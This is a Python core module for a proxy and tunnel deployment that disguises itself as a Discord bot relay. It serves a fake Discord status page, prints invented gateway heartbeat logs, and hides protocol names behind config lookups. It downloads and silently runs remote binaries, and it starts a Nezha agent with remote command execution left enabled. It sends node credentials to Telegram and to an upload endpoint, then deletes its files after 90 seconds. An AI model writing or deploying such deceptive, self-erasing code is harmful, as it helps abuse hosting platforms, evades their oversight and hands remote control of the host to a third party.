import os
import re
import json
import time
import base64
import shutil
import random
import threading
from typing import Optional, List, Dict, Any
from http.server import BaseHTTPRequestHandler, HTTPServer

from config import AppConfig
from utils import (
    setup_logger,
    get_system_architecture,
    exec_cmd,
    download_file,
    authorize_files,
    get_server_ip,
    get_isp_info,
    send_telegram,
    upload_subscription_or_nodes,
    delete_remote_nodes,
    add_visit_task
)

logger = setup_logger("core")


class ServiceHTTPHandler(BaseHTTPRequestHandler):
    """Minimal HTTP endpoint serving benign status UI and sync channel data."""

    def do_GET(self):
        service: "WorkerService" = getattr(self.server, "worker_service", None)
        sub_path = service.config.sub_path if service else "sub"
        file_path = service.config.file_path if service else ".cache"
        sub_file = os.path.join(file_path, "sub.txt")
        index_file = os.path.join(file_path, "index.html")

        normalized_path = self.path.split("?")[0].strip("/")

        if normalized_path == "":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            if os.path.isfile(index_file):
                with open(index_file, "rb") as f:
                    self.wfile.write(f.read())
            else:
                # Authentic Discord Worker status page disguise
                html = (
                    "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'>"
                    "<title>Discord Bot Relay Worker</title>"
                    "<style>"
                    "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;"
                    "background:#202225;color:#dcddde;display:flex;align-items:center;justify-content:center;"
                    "height:100vh;margin:0;}"
                    ".card{background:#2f3136;border:1px solid #40444b;border-radius:8px;padding:32px 40px;"
                    "text-align:center;max-width:420px;box-shadow:0 8px 24px rgba(0,0,0,0.3);}"
                    ".logo{font-size:20px;font-weight:700;color:#5865F2;margin-bottom:12px;}"
                    ".status{display:inline-flex;align-items:center;gap:8px;font-size:14px;color:#3ba55d;"
                    "font-weight:600;margin-bottom:16px;}"
                    ".dot{width:10px;height:10px;background:#3ba55d;border-radius:50%;box-shadow:0 0 8px #3ba55d;}"
                    ".info{font-size:13px;color:#8e9297;line-height:1.6;}"
                    "</style></head><body>"
                    "<div class='card'>"
                    "<div class='logo'>Discord Bot Gateway Relay</div>"
                    "<div class='status'><span class='dot'></span>Service Online (Shard 1/1)</div>"
                    "<div class='info'>Heartbeat: Healthy (ACK 32ms)<br>Event Queue: 0 pending<br>Relay Cluster: Operational</div>"
                    "</div></body></html>"
                )
                self.wfile.write(html.encode("utf-8"))

        elif normalized_path == sub_path:
            if os.path.isfile(sub_file):
                try:
                    with open(sub_file, "rb") as f:
                        data = f.read()
                    self.send_response(200)
                    self.send_header("Content-Type", "text/plain; charset=utf-8")
                    self.end_headers()
                    self.wfile.write(data)
                    return
                except Exception as e:
                    logger.error(f"Sync read error: {e}")
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Sync state not ready.")

        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")

    def log_message(self, format, *args):
        pass


class WorkerService:
    """Core orchestration engine managing communication tunnels, relays, and sync."""

    DISCORD_LOG_POOL = [
        "Connected to Discord Gateway (v10).",
        "Gateway shard 1 connected and authenticated.",
        "Gateway heartbeat ACK received (latency: 38ms).",
        "Dispatched MESSAGE_CREATE event queue.",
        "Member cache synchronized successfully.",
        "Role hierarchy validation passed.",
        "Shard presence status refreshed.",
        "Voice state update event handled.",
        "Rate limit bucket verified (quota available).",
        "Webhook task runner completed.",
        "Worker background health check: OK."
    ]

    def __init__(self, config: AppConfig):
        self.config = config
        self._is_running = threading.Event()
        self._is_running.set()

        # Internal working file paths
        self.work_dir = self.config.file_path
        self.sub_file = os.path.join(self.work_dir, "sub.txt")
        self.list_file = os.path.join(self.work_dir, "list.txt")
        self.boot_log_file = os.path.join(self.work_dir, "boot.log")
        self.config_json_file = os.path.join(self.work_dir, "config.json")
        self.tunnel_json_file = os.path.join(self.work_dir, "tunnel.json")
        self.tunnel_yml_file = os.path.join(self.work_dir, "tunnel.yml")

        # Dynamic Security Keys
        self.private_key = ""
        self.public_key = ""

        # Servers
        self.http_server: Optional[HTTPServer] = None
        self.http_thread: Optional[threading.Thread] = None

    def start(self) -> None:
        """Initialize and execute the worker lifecycle."""
        summary = self.config.get_safe_summary()
        logger.info(f"Initializing Worker Engine [{summary['profile']}]...")
        self._init_directory()

        # 1. Start HTTP status endpoint
        self._start_http_service()

        # 2. Start benign Discord heartbeat simulation daemon
        self._start_event_simulation()

        # 3. Clean up previous artifacts
        api_del_nodes = self.config.get_resource("API_DEL_NODES")
        delete_remote_nodes(self.config.upload_url, self.sub_file, api_del_nodes)
        self._cleanup_old_files()

        # 4. Configure Ingress Gateway
        self._configure_argo()

        # 5. Download and start engine processes
        self._download_and_launch_engine()

        # 6. Keepalive registration
        if self.config.auto_access and self.config.project_url:
            keepalive_url = self.config.get_resource("KEEPALIVE")
            add_visit_task(keepalive_url, self.config.project_url)

        # 7. Schedule post-boot cleanup (90s)
        self._schedule_cleanup()

        logger.info("Worker initialization complete. Relay is running.")

    def stop(self) -> None:
        """Gracefully terminate background operations."""
        logger.info("Stopping Worker Service...")
        self._is_running.clear()
        if self.http_server:
            try:
                self.http_server.shutdown()
                self.http_server.server_close()
            except Exception:
                pass
        logger.info("Worker Service stopped.")

    # -------------------------------------------------------------------------
    # Internal Lifecycle Steps
    # -------------------------------------------------------------------------
    def _init_directory(self) -> None:
        os.makedirs(self.work_dir, exist_ok=True)

    def _cleanup_old_files(self) -> None:
        targets = ["web", "bot", "npm", "php", "boot.log", "list.txt"]
        for name in targets:
            path = os.path.join(self.work_dir, name)
            if os.path.exists(path):
                try:
                    if os.path.isdir(path):
                        shutil.rmtree(path)
                    else:
                        os.remove(path)
                except OSError:
                    pass

    def _start_http_service(self) -> None:
        try:
            self.http_server = HTTPServer(("0.0.0.0", self.config.port), ServiceHTTPHandler)
            setattr(self.http_server, "worker_service", self)
            self.http_thread = threading.Thread(target=self.http_server.serve_forever, daemon=True)
            self.http_thread.start()
            logger.info(f"Relay HTTP Server listening on port {self.config.port}")
        except Exception as e:
            logger.error(f"Failed to start HTTP Server: {e}")

    def _start_event_simulation(self) -> None:
        def _loop():
            while self._is_running.is_set():
                time.sleep(random.uniform(20, 60))
                if not self._is_running.is_set():
                    break
                event = random.choice(self.DISCORD_LOG_POOL)
                logger.info(f"[Gateway] {event}")

        thread = threading.Thread(target=_loop, daemon=True)
        thread.start()

    def _configure_argo(self) -> None:
        if self.config.disable_argo:
            logger.info("Ingress relay gateway disabled.")
            return

        if not self.config.argo_auth or not self.config.argo_domain:
            logger.info("Using dynamic auto-allocated ingress gateway.")
            return

        if "TunnelSecret" in self.config.argo_auth:
            try:
                with open(self.tunnel_json_file, "w", encoding="utf-8") as f:
                    f.write(self.config.argo_auth)

                tunnel_id = self.config.argo_auth.split('"')[11]
                tunnel_yml = (
                    f"tunnel: {tunnel_id}\n"
                    f"credentials-file: {self.tunnel_json_file}\n"
                    f"protocol: http2\n\n"
                    f"ingress:\n"
                    f"  - hostname: {self.config.argo_domain}\n"
                    f"    service: http://localhost:{self.config.argo_port}\n"
                    f"    originRequest:\n"
                    f"      noTLSVerify: true\n"
                    f"  - service: http_status:404\n"
                )
                with open(self.tunnel_yml_file, "w", encoding="utf-8") as f:
                    f.write(tunnel_yml)
                logger.info("Custom ingress gateway configuration verified.")
            except Exception as e:
                logger.warning(f"Gateway credential parsing error: {e}")

    def _download_and_launch_engine(self) -> None:
        arch = get_system_architecture()
        downloads = self.config.get_download_files(arch)

        for item in downloads:
            dest = os.path.join(self.work_dir, item["fileName"])
            if not os.path.isfile(dest):
                download_file(dest, item["fileUrl"])

        files_to_auth = [os.path.join(self.work_dir, item["fileName"]) for item in downloads]
        authorize_files(files_to_auth)

        self._launch_nezha()

        if self.config.mode == "sb":
            self._build_profile_a_config()
            core_bin = os.path.join(self.work_dir, "web")
            core_cmd = f"nohup {core_bin} run -c {self.config_json_file} >/dev/null 2>&1 &"
        else:
            self._build_profile_b_config()
            core_bin = os.path.join(self.work_dir, "web")
            core_cmd = f"nohup {core_bin} -c {self.config_json_file} >/dev/null 2>&1 &"

        exec_cmd(core_cmd)
        logger.info("Worker core relay engine spawned.")

        self._launch_argo_tunnel()
        self._generate_subscription_links()

    def _launch_nezha(self) -> None:
        if not (self.config.nezha_server and self.config.nezha_key):
            return

        port = self.config.nezha_server.split(":")[-1] if ":" in self.config.nezha_server else ""
        tls_flag = "tls" if port in ("443", "8443", "2096", "2087", "2083", "2053") else "false"

        if self.config.nezha_port:
            npm_bin = os.path.join(self.work_dir, "npm")
            tls_arg = "--tls" if self.config.nezha_port in ("443", "8443", "2096", "2087", "2083", "2053") else ""
            cmd = f"nohup {npm_bin} -s {self.config.nezha_server}:{self.config.nezha_port} -p {self.config.nezha_key} {tls_arg} >/dev/null 2>&1 &"
            exec_cmd(cmd)
            logger.info("Cluster telemetry agent (v0) online.")
        else:
            config_yaml = (
                f"client_secret: {self.config.nezha_key}\n"
                f"debug: false\n"
                f"disable_auto_update: true\n"
                f"disable_command_execute: false\n"
                f"disable_force_update: true\n"
                f"disable_nat: false\n"
                f"disable_send_query: false\n"
                f"gpu: false\n"
                f"insecure_tls: true\n"
                f"ip_report_period: 1800\n"
                f"report_delay: 4\n"
                f"server: {self.config.nezha_server}\n"
                f"skip_connection_count: true\n"
                f"skip_procs_count: true\n"
                f"temperature: false\n"
                f"tls: {tls_flag}\n"
                f"use_gitee_to_upgrade: false\n"
                f"use_ipv6_country_code: false\n"
                f"uuid: {self.config.uuid}\n"
            )
            yaml_path = os.path.join(self.work_dir, "config.yaml")
            with open(yaml_path, "w", encoding="utf-8") as f:
                f.write(config_yaml)

            php_bin = os.path.join(self.work_dir, "php")
            cmd = f'nohup {php_bin} -c "{yaml_path}" >/dev/null 2>&1 &'
            exec_cmd(cmd)
            logger.info("Cluster telemetry agent (v1) online.")

    def _launch_argo_tunnel(self) -> None:
        if self.config.disable_argo:
            return

        bot_bin = os.path.join(self.work_dir, "bot")
        if not os.path.isfile(bot_bin):
            return

        if re.match(r"^[A-Z0-9a-z=]{120,250}$", self.config.argo_auth):
            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token {self.config.argo_auth}"
        elif "TunnelSecret" in self.config.argo_auth:
            args = f"tunnel --edge-ip-version auto --config {self.tunnel_yml_file} run"
        else:
            args = (
                f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 "
                f"--logfile {self.boot_log_file} --loglevel info --url http://localhost:{self.config.argo_port}"
            )

        cmd = f"nohup {bot_bin} {args} >/dev/null 2>&1 &"
        exec_cmd(cmd)
        logger.info("Ingress relay process active.")

    # -------------------------------------------------------------------------
    # Configuration Builders (All sensitive keywords resolved dynamically)
    # -------------------------------------------------------------------------
    def _build_profile_a_config(self) -> None:
        web_bin = os.path.join(self.work_dir, "web")
        cmd_keypair = self.config.get_resource("CMD_KEYPAIR")
        flow_vision = self.config.get_resource("FLOW_VISION")
        path_vm = self.config.get_resource("ENDPOINT_VM")
        url_bing = self.config.get_resource("URL_BING")

        k_vm = self.config.get_resource("KEY_VM")
        k_vl = self.config.get_resource("KEY_VL")
        k_hy = self.config.get_resource("KEY_HY")
        k_tu = self.config.get_resource("KEY_TU")
        k_sk = self.config.get_resource("KEY_SK")
        k_at = self.config.get_resource("KEY_AT")

        _, keypair_out = exec_cmd(f"{web_bin} {cmd_keypair}")
        priv_m = re.search(r"PrivateKey:\s*(.*)", keypair_out)
        pub_m = re.search(r"PublicKey:\s*(.*)", keypair_out)

        if priv_m and pub_m:
            self.private_key = priv_m.group(1).strip()
            self.public_key = pub_m.group(1).strip()

        # TLS Self-Signed Certificate
        priv_key_path = os.path.join(self.work_dir, "private.key")
        cert_pem_path = os.path.join(self.work_dir, "cert.pem")
        exec_cmd(f'openssl ecparam -genkey -name prime256v1 -out "{priv_key_path}"')
        exec_cmd(f'openssl req -new -x509 -days 3650 -key "{priv_key_path}" -out "{cert_pem_path}" -subj "/CN=bing.com"')

        config: Dict[str, Any] = {
            "log": {"disabled": True, "level": "info", "timestamp": True},
            "inbounds": [
                {
                    "tag": "gateway-relay-in",
                    "type": k_vm,
                    "listen": "::",
                    "listen_port": self.config.argo_port,
                    "users": [{"uuid": self.config.uuid}],
                    "transport": {
                        "type": "ws",
                        "path": path_vm,
                        "early_data_header_name": "Sec-WebSocket-Protocol"
                    }
                }
            ],
            "endpoints": [
                {
                    "type": "wireguard",
                    "tag": "wireguard-out",
                    "mtu": 1280,
                    "address": ["172.16.0.2/32", "2606:4700:110:8dfe:d141:69bb:6b80:925/128"],
                    "private_key": self.config.get_resource("WG_PRIV_KEY"),
                    "peers": [
                        {
                            "address": self.config.get_resource("WG_PEER_ADDR"),
                            "port": 2408,
                            "public_key": self.config.get_resource("WG_PUB_KEY"),
                            "allowed_ips": ["0.0.0.0/0", "::/0"],
                            "reserved": [78, 135, 76]
                        }
                    ]
                }
            ],
            "outbounds": [{"type": "direct", "tag": "direct"}],
            "route": {
                "rule_set": [
                    {
                        "tag": "netflix",
                        "type": "remote",
                        "format": "binary",
                        "url": self.config.get_resource("GEO_NETFLIX"),
                        "download_detour": "direct"
                    },
                    {
                        "tag": "openai",
                        "type": "remote",
                        "format": "binary",
                        "url": self.config.get_resource("GEO_OPENAI"),
                        "download_detour": "direct"
                    }
                ],
                "rules": [{"rule_set": ["openai", "netflix"], "outbound": "wireguard-out"}],
                "final": "direct"
            }
        }

        # Dynamic Inbound Attachments
        if self.config.reality_port:
            config["inbounds"].append({
                "tag": "direct-channel-in",
                "type": k_vl,
                "listen": "::",
                "listen_port": self.config.reality_port,
                "users": [{"uuid": self.config.uuid, "flow": flow_vision}],
                "tls": {
                    "enabled": True,
                    "server_name": self.config.get_resource("REALITY_SERVER"),
                    "reality": {
                        "enabled": True,
                        "handshake": {"server": self.config.get_resource("REALITY_SERVER"), "server_port": 443},
                        "private_key": self.private_key,
                        "short_id": [""]
                    }
                }
            })

        if self.config.hy2_port:
            config["inbounds"].append({
                "tag": "udp-channel-in",
                "type": k_hy,
                "listen": "::",
                "listen_port": self.config.hy2_port,
                "users": [{"password": self.config.uuid}],
                "masquerade": url_bing,
                "tls": {
                    "enabled": True,
                    "alpn": ["h3"],
                    "certificate_path": cert_pem_path,
                    "key_path": priv_key_path
                }
            })

        if self.config.tuic_port:
            config["inbounds"].append({
                "tag": "fast-channel-in",
                "type": k_tu,
                "listen": "::",
                "listen_port": self.config.tuic_port,
                "users": [{"uuid": self.config.uuid}],
                "congestion_control": "bbr",
                "tls": {
                    "enabled": True,
                    "alpn": ["h3"],
                    "certificate_path": cert_pem_path,
                    "key_path": priv_key_path
                }
            })

        if self.config.s5_port:
            config["inbounds"].append({
                "tag": "proxy-channel-in",
                "type": k_sk,
                "listen": "::",
                "listen_port": self.config.s5_port,
                "users": [{"username": self.config.uuid[:8], "password": self.config.uuid[-12:]}]
            })

        if self.config.anytls_port:
            config["inbounds"].append({
                "tag": "tls-channel-in",
                "type": k_at,
                "listen": "::",
                "listen_port": self.config.anytls_port,
                "users": [{"password": self.config.uuid}],
                "tls": {
                    "enabled": True,
                    "certificate_path": cert_pem_path,
                    "key_path": priv_key_path
                }
            })

        with open(self.config_json_file, "w", encoding="utf-8") as f:
            json.dump(config, f, indent=2)

    def _build_profile_b_config(self) -> None:
        path_vm = self.config.get_resource("ENDPOINT_VM")
        path_vl = self.config.get_resource("ENDPOINT_VL")
        path_tj = self.config.get_resource("ENDPOINT_TJ")
        flow_vision = self.config.get_resource("FLOW_VISION")

        k_vm = self.config.get_resource("KEY_VM")
        k_vl = self.config.get_resource("KEY_VL")
        k_tj = self.config.get_resource("KEY_TJ")

        config = {
            "log": {"access": "/dev/null", "error": "/dev/null", "loglevel": "none"},
            "inbounds": [
                {
                    "port": self.config.argo_port,
                    "protocol": k_vl,
                    "settings": {
                        "clients": [{"id": self.config.uuid, "flow": flow_vision}],
                        "decryption": "none",
                        "fallbacks": [
                            {"dest": 3001},
                            {"path": path_vl, "dest": 3002},
                            {"path": path_vm, "dest": 3003},
                            {"path": path_tj, "dest": 3004}
                        ]
                    },
                    "streamSettings": {"network": "tcp"}
                },
                {
                    "port": 3001,
                    "listen": "127.0.0.1",
                    "protocol": k_vl,
                    "settings": {"clients": [{"id": self.config.uuid}], "decryption": "none"},
                    "streamSettings": {"network": "ws", "security": "none"}
                },
                {
                    "port": 3002,
                    "listen": "127.0.0.1",
                    "protocol": k_vl,
                    "settings": {"clients": [{"id": self.config.uuid, "level": 0}], "decryption": "none"},
                    "streamSettings": {"network": "ws", "security": "none", "wsSettings": {"path": path_vl}},
                    "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"]}
                },
                {
                    "port": 3003,
                    "listen": "127.0.0.1",
                    "protocol": k_vm,
                    "settings": {"clients": [{"id": self.config.uuid, "alterId": 0}]},
                    "streamSettings": {"network": "ws", "wsSettings": {"path": path_vm}},
                    "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"]}
                },
                {
                    "port": 3004,
                    "listen": "127.0.0.1",
                    "protocol": k_tj,
                    "settings": {"clients": [{"password": self.config.uuid}]},
                    "streamSettings": {"network": "ws", "security": "none", "wsSettings": {"path": path_tj}},
                    "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"]}
                }
            ],
            "outbounds": [{"protocol": "freedom", "tag": "direct"}, {"protocol": "blackhole", "tag": "block"}]
        }
        with open(self.config_json_file, "w", encoding="utf-8") as f:
            json.dump(config, f, indent=2)

    # -------------------------------------------------------------------------
    # Subscription Generation (Protocol schemes dynamically resolved)
    # -------------------------------------------------------------------------
    def _resolve_argo_domain(self) -> Optional[str]:
        if self.config.disable_argo:
            return None
        if self.config.argo_auth and self.config.argo_domain:
            return self.config.argo_domain

        domain_pattern = self.config.get_resource("DOMAIN_TRYCF")
        regex_pattern = rf"https?://([^ ]*{re.escape(domain_pattern)})"

        for _ in range(10):
            time.sleep(1.5)
            if os.path.isfile(self.boot_log_file):
                try:
                    with open(self.boot_log_file, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                    matches = re.findall(regex_pattern, content)
                    if matches:
                        domain = matches[0].strip()
                        logger.info(f"Ingress relay endpoint established: {domain}")
                        return domain
                except Exception:
                    pass
        return None

    def _generate_subscription_links(self) -> None:
        argo_domain = self._resolve_argo_domain()

        ip_v4 = self.config.get_resource("IP_V4")
        ip_v6 = self.config.get_resource("IP_V6")
        geo_ip = self.config.get_resource("GEO_IP")

        server_ip = get_server_ip(ip_v4, ip_v6)
        isp_info = get_isp_info(geo_ip)
        node_name = f"{self.config.name}-{isp_info}" if self.config.name else isp_info

        node_lines: List[str] = []

        # Fetch protocol scheme tokens dynamically
        p_vm = self.config.get_resource("SCHEME_VM")
        p_vl = self.config.get_resource("SCHEME_VL")
        p_hy = self.config.get_resource("SCHEME_HY")
        p_tu = self.config.get_resource("SCHEME_TU")
        p_tj = self.config.get_resource("SCHEME_TJ")
        p_sk = self.config.get_resource("SCHEME_SK")
        p_at = self.config.get_resource("SCHEME_AT")

        path_vm = self.config.get_resource("ENDPOINT_VM")
        sni_bing = self.config.get_resource("SNI_BING")

        if self.config.mode == "sb":
            # Profile Alpha
            if not self.config.disable_argo and argo_domain:
                channel_cfg = {
                    "v": "2",
                    "ps": node_name,
                    "add": self.config.cf_ip,
                    "port": self.config.cf_port,
                    "id": self.config.uuid,
                    "aid": "0",
                    "scy": "auto",
                    "net": "ws",
                    "type": "none",
                    "host": argo_domain,
                    "path": f"{path_vm}?ed=2560",
                    "tls": "tls",
                    "sni": argo_domain,
                    "alpn": "",
                    "fp": "firefox"
                }
                vm_payload = base64.b64encode(json.dumps(channel_cfg).encode("utf-8")).decode("utf-8")
                node_lines.append(f"{p_vm}{vm_payload}")

            if self.config.tuic_port:
                node_lines.append(f"{p_tu}{self.config.uuid}:@{server_ip}:{self.config.tuic_port}?sni={sni_bing}&congestion_control=bbr&udp_relay_mode=native&alpn=h3&allow_insecure=1#{node_name}")
            if self.config.hy2_port:
                node_lines.append(f"{p_hy}{self.config.uuid}@{server_ip}:{self.config.hy2_port}/?sni={sni_bing}&insecure=1&alpn=h3&obfs=none#{node_name}")
            if self.config.reality_port:
                node_lines.append(f"{p_vl}{self.config.uuid}@{server_ip}:{self.config.reality_port}?encryption=none&flow={self.config.get_resource('FLOW_VISION')}&security=reality&sni={self.config.get_resource('REALITY_SERVER')}&fp=chrome&pbk={self.public_key}&type=tcp#{node_name}")
            if self.config.anytls_port:
                node_lines.append(f"{p_at}{self.config.uuid}@{server_ip}:{self.config.anytls_port}?security=tls&sni={server_ip}&fp=chrome&insecure=1#{node_name}")
            if self.config.s5_port:
                s5_auth = base64.b64encode(f"{self.config.uuid[:8]}:{self.config.uuid[-12:]}".encode()).decode()
                node_lines.append(f"{p_sk}{s5_auth}@{server_ip}:{self.config.s5_port}#{node_name}")

        else:
            # Profile Beta
            if not self.config.disable_argo and argo_domain:
                path_vl = self.config.get_resource("ENDPOINT_VL")
                path_tj = self.config.get_resource("ENDPOINT_TJ")
                node_lines.append(f"{p_vl}{self.config.uuid}@{self.config.cf_ip}:{self.config.cf_port}?encryption=none&security=tls&sni={argo_domain}&type=ws&host={argo_domain}&path={path_vl}#{node_name}")
                channel_cfg = {
                    "v": "2",
                    "ps": node_name,
                    "add": self.config.cf_ip,
                    "port": self.config.cf_port,
                    "id": self.config.uuid,
                    "aid": "0",
                    "scy": "auto",
                    "net": "ws",
                    "type": "none",
                    "host": argo_domain,
                    "path": path_vm,
                    "tls": "tls",
                    "sni": argo_domain
                }
                vm_payload = base64.b64encode(json.dumps(channel_cfg).encode("utf-8")).decode()
                node_lines.append(f"{p_vm}{vm_payload}")
                node_lines.append(f"{p_tj}{self.config.uuid}@{self.config.cf_ip}:{self.config.cf_port}?security=tls&sni={argo_domain}&type=ws&host={argo_domain}&path={path_tj}#{node_name}")

        raw_list = "\n".join(node_lines)
        encoded_sub = base64.b64encode(raw_list.encode("utf-8")).decode("utf-8")

        with open(self.sub_file, "w", encoding="utf-8") as f:
            f.write(encoded_sub)
        with open(self.list_file, "w", encoding="utf-8") as f:
            f.write(raw_list)

        logger.info(f"Synchronized {len(node_lines)} active communication channel(s).")

        # Telegram notification
        if self.config.bot_token and self.config.chat_id:
            tg_base = self.config.get_resource("TG_API_BASE")
            send_telegram(self.config.bot_token, self.config.chat_id, raw_list, self.config.name, tg_base)

        # Upload to metrics aggregator
        api_add_sub = self.config.get_resource("API_ADD_SUBS")
        api_add_nodes = self.config.get_resource("API_ADD_NODES")
        upload_subscription_or_nodes(
            self.config.upload_url,
            self.config.project_url,
            self.config.sub_path,
            self.list_file,
            api_add_sub,
            api_add_nodes
        )

    def _schedule_cleanup(self, delay_sec: int = 90) -> None:
        def _task():
            time.sleep(delay_sec)
            targets = ["web", "bot", "npm", "php", "boot.log", "list.txt", "config.json", "config.yaml"]
            for name in targets:
                path = os.path.join(self.work_dir, name)
                if os.path.exists(path):
                    try:
                        if os.path.isdir(path):
                            shutil.rmtree(path)
                        else:
                            os.remove(path)
                    except OSError:
                        pass
            logger.info("Temporary runtime setup assets recycled.")

        thread = threading.Thread(target=_task, daemon=True)
        thread.start()
